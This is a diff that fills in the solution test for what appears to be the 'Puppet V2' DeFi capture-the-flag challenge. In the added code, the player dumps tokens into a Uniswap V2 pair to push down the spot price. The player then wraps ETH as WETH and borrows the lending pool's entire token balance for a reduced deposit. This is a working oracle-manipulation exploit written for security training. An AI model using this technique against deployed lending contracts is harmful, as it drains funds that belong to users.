@@ -76,7 +76,6 @@ contract PuppetV2Challenge is Test {
         // Setup initial token balances of pool and player accounts
         token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
         token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
-
         vm.stopPrank();
     }
 
@@ -98,7 +97,14 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        token.transfer(address(uniswapV2Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Exchange.swap(99e17, 0, player, "");
+        weth.deposit{value:player.balance}();
+        console.log(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
+        console.log(weth.balanceOf(player));
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
